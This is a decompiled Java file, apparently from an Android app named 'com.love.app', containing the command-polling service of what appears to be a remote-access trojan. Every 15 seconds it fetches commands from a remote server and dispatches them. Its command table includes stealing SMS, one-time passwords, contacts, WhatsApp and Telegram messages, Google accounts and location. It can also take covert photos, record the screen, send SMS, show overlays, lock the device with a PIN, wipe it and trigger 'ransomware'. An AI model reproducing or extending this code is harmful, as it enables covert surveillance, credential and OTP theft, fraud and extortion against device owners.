/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Service
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.SharedPreferences
 *  android.os.Handler
 *  android.os.IBinder
 *  android.os.Looper
 *  android.provider.Settings$Secure
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.love.app;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.love.app.CommandService$$ExternalSyntheticLambda0;
import com.love.app.CommandService$$ExternalSyntheticLambda1;
import com.love.app.ConfigFetcher;
import com.love.app.ForegroundService;
import org.json.JSONObject;

public class CommandService
extends Service {
    private static final String TAG = "CommandService";
    private String deviceId;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isPolling = false;
    private Runnable pollRunnable;
    private SharedPreferences prefs;
    private RequestQueue requestQueue;

    static /* synthetic */ void lambda$pollCommand$1(VolleyError volleyError) {
        if (volleyError.networkResponse == null || volleyError.networkResponse.statusCode != 204) {
            Log.w((String)TAG, (String)("Poll error: " + volleyError.getMessage()));
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private int parseCommandString(String string2) {
        try {
            return Integer.parseInt(string2);
        }
        catch (NumberFormatException numberFormatException) {
            int n;
            string2.hashCode();
            int n2 = -1;
            switch (string2.hashCode()) {
                case 1996575404: {
                    if (!string2.equals("torch_off")) break;
                    n2 = 1;
                    break;
                }
                case 1976113595: {
                    if (!string2.equals("get_apps")) break;
                    n2 = 2;
                    break;
                }
                case 1804460828: {
                    if (!string2.equals("get_contacts")) break;
                    n2 = 3;
                    break;
                }
                case 1535597502: {
                    if (!string2.equals("set_lock_pin")) break;
                    n2 = 4;
                    break;
                }
                case 1272354024: {
                    if (!string2.equals("notifications")) break;
                    n2 = 5;
                    break;
                }
                case 1247787042: {
                    if (!string2.equals("send_sms")) break;
                    n2 = 6;
                    break;
                }
                case 1198876607: {
                    if (!string2.equals("get_notifications")) break;
                    n2 = 7;
                    break;
                }
                case 1082295672: {
                    if (!string2.equals("recents")) break;
                    n2 = 8;
                    break;
                }
                case 1064581370: {
                    if (!string2.equals("upload_file")) break;
                    n2 = 9;
                    break;
                }
                case 1011444682: {
                    if (!string2.equals("get_telegram")) break;
                    n2 = 10;
                    break;
                }
                case 830295483: {
                    if (!string2.equals("send_voice")) break;
                    n2 = 11;
                    break;
                }
                case 686056844: {
                    if (!string2.equals("take_photo_back")) break;
                    n2 = 12;
                    break;
                }
                case 671038429: {
                    if (!string2.equals("screen_record_stop")) break;
                    n2 = 13;
                    break;
                }
                case 546749333: {
                    if (!string2.equals("launch_app")) break;
                    n2 = 14;
                    break;
                }
                case 544331407: {
                    if (!string2.equals("ransomware")) break;
                    n2 = 15;
                    break;
                }
                case 466353328: {
                    if (!string2.equals("get_whatsapp_messages")) break;
                    n2 = 16;
                    break;
                }
                case 451310959: {
                    if (!string2.equals("vibrate")) break;
                    n2 = 17;
                    break;
                }
                case 423583661: {
                    if (!string2.equals("get_whatsapp_number")) break;
                    n2 = 18;
                    break;
                }
                case 358798490: {
                    if (!string2.equals("set_lock_mode")) break;
                    n2 = 19;
                    break;
                }
                case 354039290: {
                    if (!string2.equals("voice_message")) break;
                    n2 = 20;
                    break;
                }
                case 285901196: {
                    if (!string2.equals("overlay_show")) break;
                    n2 = 21;
                    break;
                }
                case 285574097: {
                    if (!string2.equals("overlay_hide")) break;
                    n2 = 22;
                    break;
                }
                case 3649607: {
                    if (!string2.equals("wipe")) break;
                    n2 = 23;
                    break;
                }
                case 3208415: {
                    if (!string2.equals("home")) break;
                    n2 = 24;
                    break;
                }
                case 3015911: {
                    if (!string2.equals("back")) break;
                    n2 = 25;
                    break;
                }
                case -22011266: {
                    if (!string2.equals("get_location")) break;
                    n2 = 26;
                    break;
                }
                case -74784528: {
                    if (!string2.equals("get_sms")) break;
                    n2 = 27;
                    break;
                }
                case -74788158: {
                    if (!string2.equals("get_otp")) break;
                    n2 = 28;
                    break;
                }
                case -119802007: {
                    if (!string2.equals("get_gallery")) break;
                    n2 = 29;
                    break;
                }
                case -202862044: {
                    if (!string2.equals("take_photo_front")) break;
                    n2 = 30;
                    break;
                }
                case -381820416: {
                    if (!string2.equals("lock_screen")) break;
                    n2 = 31;
                    break;
                }
                case -416447130: {
                    if (!string2.equals("screenshot")) break;
                    n2 = 32;
                    break;
                }
                case -471045599: {
                    if (!string2.equals("get_telegram_messages")) break;
                    n2 = 33;
                    break;
                }
                case -529991613: {
                    if (!string2.equals("get_google_accounts")) break;
                    n2 = 34;
                    break;
                }
                case -531454649: {
                    if (!string2.equals("get_call_logs")) break;
                    n2 = 35;
                    break;
                }
                case -625596190: {
                    if (!string2.equals("uninstall")) break;
                    n2 = 36;
                    break;
                }
                case -672658457: {
                    if (!string2.equals("screen_record_start")) break;
                    n2 = 37;
                    break;
                }
                case -703061618: {
                    if (!string2.equals("get_device_info")) break;
                    n2 = 38;
                    break;
                }
                case -801679400: {
                    if (!string2.equals("get_file_list")) break;
                    n2 = 39;
                    break;
                }
                case -905425662: {
                    if (!string2.equals("torch_on")) break;
                    n2 = 40;
                    break;
                }
                case -1153238695: {
                    if (!string2.equals("torch_blink")) break;
                    n2 = 41;
                    break;
                }
                case -1166066892: {
                    if (!string2.equals("screen_message")) break;
                    n2 = 42;
                    break;
                }
                case -1361568365: {
                    if (!string2.equals("enable_admin")) break;
                    n2 = 43;
                    break;
                }
                case -1547878349: {
                    if (!string2.equals("change_wallpaper")) break;
                    n2 = 44;
                    break;
                }
                case -1772451948: {
                    if (!string2.equals("get_browser_history")) break;
                    n2 = 45;
                    break;
                }
            }
            switch (n2) {
                default: {
                    n = -1;
                    break;
                }
                case 1: {
                    n = 44;
                    break;
                }
                case 2: {
                    n = 43;
                    break;
                }
                case 3: {
                    n = 42;
                    break;
                }
                case 4: {
                    n = 41;
                    break;
                }
                case 5: {
                    n = 40;
                    break;
                }
                case 6: {
                    n = 39;
                    break;
                }
                case 7: {
                    n = 38;
                    break;
                }
                case 8: {
                    n = 37;
                    break;
                }
                case 9: {
                    n = 36;
                    break;
                }
                case 10: {
                    n = 35;
                    break;
                }
                case 11: {
                    n = 34;
                    break;
                }
                case 12: {
                    n = 33;
                    break;
                }
                case 13: {
                    n = 32;
                    break;
                }
                case 14: {
                    n = 31;
                    break;
                }
                case 15: {
                    n = 30;
                    break;
                }
                case 16: {
                    n = 29;
                    break;
                }
                case 17: {
                    n = 28;
                    break;
                }
                case 18: {
                    n = 27;
                    break;
                }
                case 19: {
                    n = 26;
                    break;
                }
                case 20: {
                    n = 25;
                    break;
                }
                case 21: {
                    n = 24;
                    break;
                }
                case 22: {
                    n = 23;
                    break;
                }
                case 23: {
                    n = 22;
                    break;
                }
                case 24: {
                    n = 21;
                    break;
                }
                case 25: {
                    n = 20;
                    break;
                }
                case 26: {
                    n = 19;
                    break;
                }
                case 27: {
                    n = 18;
                    break;
                }
                case 28: {
                    n = 17;
                    break;
                }
                case 29: {
                    n = 16;
                    break;
                }
                case 30: {
                    n = 15;
                    break;
                }
                case 31: {
                    n = 14;
                    break;
                }
                case 32: {
                    n = 13;
                    break;
                }
                case 33: {
                    n = 12;
                    break;
                }
                case 34: {
                    n = 11;
                    break;
                }
                case 35: {
                    n = 10;
                    break;
                }
                case 36: {
                    n = 9;
                    break;
                }
                case 37: {
                    n = 8;
                    break;
                }
                case 38: {
                    n = 7;
                    break;
                }
                case 39: {
                    n = 6;
                    break;
                }
                case 40: {
                    n = 5;
                    break;
                }
                case 41: {
                    n = 4;
                    break;
                }
                case 42: {
                    n = 3;
                    break;
                }
                case 43: {
                    n = 2;
                    break;
                }
                case 44: {
                    n = 1;
                    break;
                }
                case 45: {
                    n = 0;
                }
            }
            switch (n) {
                default: {
                    return -1;
                }
                case 44: {
                    return 1017;
                }
                case 43: {
                    return 1596485;
                }
                case 42: {
                    return 1001;
                }
                case 41: {
                    return 87654321;
                }
                case 40: {
                    return 45832158;
                }
                case 39: {
                    return 1003;
                }
                case 38: {
                    return 1019;
                }
                case 37: {
                    return 33654789;
                }
                case 36: {
                    return 1015;
                }
                case 35: {
                    return 1052;
                }
                case 34: {
                    return 2001;
                }
                case 33: {
                    return 11223344;
                }
                case 32: {
                    return 1062;
                }
                case 31: {
                    return 74789654;
                }
                case 30: {
                    return 1010;
                }
                case 29: {
                    return 1054;
                }
                case 28: {
                    return 1008;
                }
                case 27: {
                    return 1050;
                }
                case 26: {
                    return 2000;
                }
                case 25: {
                    return 1012;
                }
                case 24: {
                    return 5698742;
                }
                case 23: {
                    return 89521475;
                }
                case 22: {
                    return 1009;
                }
                case 21: {
                    return 25896321;
                }
                case 20: {
                    return 66985478;
                }
                case 19: {
                    return 1005;
                }
                case 18: {
                    return 1002;
                }
                case 17: {
                    return 1051;
                }
                case 16: {
                    return 1020;
                }
                case 15: {
                    return 11223345;
                }
                case 14: {
                    return 98765432;
                }
                case 13: {
                    return 1060;
                }
                case 12: {
                    return 1055;
                }
                case 11: {
                    return 1053;
                }
                case 10: {
                    return 1004;
                }
                case 9: {
                    return 64645897;
                }
                case 8: {
                    return 1061;
                }
                case 7: {
                    return 1006;
                }
                case 6: {
                    return 1014;
                }
                case 5: {
                    return 1016;
                }
                case 4: {
                    return 1018;
                }
                case 3: {
                    return 1013;
                }
                case 2: {
                    return 99887766;
                }
                case 1: {
                    return 1011;
                }
                case 0: 
            }
            return 1007;
        }
    }

    private void pollCommand() {
        Object object = ConfigFetcher.getBaseUrl((Context)this);
        if (object != null && !((String)object).isEmpty()) {
            object = new JsonObjectRequest(0, (String)object + "/commands/poll?device_id=" + this.deviceId + "&timeout=10", null, new CommandService$$ExternalSyntheticLambda0(this), (Response.ErrorListener)new CommandService$$ExternalSyntheticLambda1());
            ((Request)object).setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
            this.requestQueue.add(object);
            return;
        }
        ConfigFetcher.loadConfig((Context)this, new ConfigFetcher.ConfigListener(this){
            final CommandService this$0;
            {
                this.this$0 = commandService;
            }

            @Override
            public void onConfigFailed() {
                Log.w((String)CommandService.TAG, (String)"pollCommand: baseUrl belum tersedia");
            }

            @Override
            public void onConfigLoaded(String string2) {
                this.this$0.pollCommand();
            }
        });
    }

    private void startPolling() {
        Runnable runnable2;
        if (this.isPolling) {
            return;
        }
        this.isPolling = true;
        this.pollRunnable = runnable2 = new Runnable(this){
            final CommandService this$0;
            {
                this.this$0 = commandService;
            }

            @Override
            public void run() {
                if (!this.this$0.isPolling) {
                    return;
                }
                this.this$0.pollCommand();
                this.this$0.handler.postDelayed((Runnable)this, 15000L);
            }
        };
        this.handler.post(runnable2);
    }

    /* synthetic */ void lambda$pollCommand$0$com_love_app_CommandService(JSONObject jSONObject) {
        try {
            String string2 = jSONObject.getString("cmd");
            String string3 = jSONObject.optString("param", "");
            String string4 = jSONObject.optString("cmdId", "");
            jSONObject = new Intent("com.love.app.EXECUTE_CMD");
            jSONObject.putExtra("cmd", this.parseCommandString(string2));
            jSONObject.putExtra("param", string3);
            jSONObject.putExtra("cmdId", string4);
            this.sendBroadcast((Intent)jSONObject);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"Parse error", (Throwable)exception);
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        Object object = this.getSharedPreferences("love_config", 0);
        this.prefs = object;
        object = object.getString("device_id", null);
        this.deviceId = object;
        if (object == null || ((String)object).isEmpty()) {
            this.deviceId = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
        }
        if ((object = this.deviceId) == null || ((String)object).isEmpty()) {
            this.deviceId = "unknown_" + System.currentTimeMillis();
        }
        this.requestQueue = Volley.newRequestQueue((Context)this);
        ConfigFetcher.loadLocalConfigSync((Context)this);
    }

    public void onDestroy() {
        super.onDestroy();
        this.isPolling = false;
        Runnable runnable2 = this.pollRunnable;
        if (runnable2 != null) {
            this.handler.removeCallbacks(runnable2);
        }
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        if (ForegroundService.isRunning()) {
            Log.d((String)TAG, (String)"ForegroundService aktif, CommandService masuk mode standby");
            this.stopSelf();
            return 2;
        }
        this.startPolling();
        return 1;
    }
}

